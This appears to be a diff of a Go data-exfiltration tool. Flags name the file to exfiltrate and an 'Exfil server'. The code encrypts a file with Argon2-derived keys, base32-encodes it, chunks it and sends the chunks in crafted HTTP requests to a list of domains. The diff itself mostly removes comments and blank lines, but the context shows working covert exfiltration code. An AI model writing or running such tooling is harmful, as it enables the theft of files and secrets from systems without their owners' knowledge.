@@ -33,7 +33,7 @@ func init() {
 	flag.StringVar(&filePath, "f", "", "Path to the file to exfiltrate")
 	flag.StringVar(&password, "p", "", "Password for encryption")
 	flag.StringVar(&uuidKey, "u", "", "UUID key for the file")
-	flag.StringVar(&exfil, "e", "", "External domain suffix for headers")
+	flag.StringVar(&exfil, "e", "", "Exfil server")
 	flag.IntVar(&numTimes, "t", 1, "Number of times to send each chunk")
 	flag.BoolVar(&verbose, "v", false, "Execute in verbose mode")
 	flag.Parse()
@@ -44,7 +44,6 @@ func init() {
 		os.Exit(1)
 	}
 }
-
 
 // generateKeyFromPassword uses Argon2 to derive a key from a given password.
 func generateKeyFromPassword(password string, keySize int) ([]byte, []byte) {
@@ -76,8 +75,6 @@ func encryptData(data, key []byte) ([]byte, []byte, error)  {
 
 func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunkID, totalChunks int, uuidKey string){
   url := fmt.Sprintf("http://%s/", domain)
-
- // ua := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15"
 
   headerMap := map[string]string{
         "host": "Host",
@@ -135,15 +132,6 @@ func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunk
 //} else {
 //    fmt.Printf(string(reqDump))
 //}
-  //req.Host = domain
-
- // Printing all_headers to verify
- // fmt.Println("Merged Headers:")
- // for key, value := range allHeaders {
- //   fmt.Printf("%s: %s\n", key, value)
- // }
-// Send the HTTP request
-
 
   // Set headers for request
   
@@ -191,7 +179,6 @@ func sendFileChunks() {
   finalData := append(salt, nonce...)
   finalData = append(finalData, encryptedData...)
 
-
   // Calculate SHA-1 hash of the original data
   hash := sha1.New()
   hash.Write(data)
@@ -201,11 +188,9 @@ func sendFileChunks() {
   encodedData := base32.StdEncoding.EncodeToString(finalData)
   encodedData = strings.TrimRight(encodedData, "=")
 
-
   // Chunk the encoded data
   chunks := chunkString(encodedData, chunkSize)
   numChunks := len(chunks)
-
 
   // Read domains from file
   domains, err := ioutil.ReadFile(domainsFile)
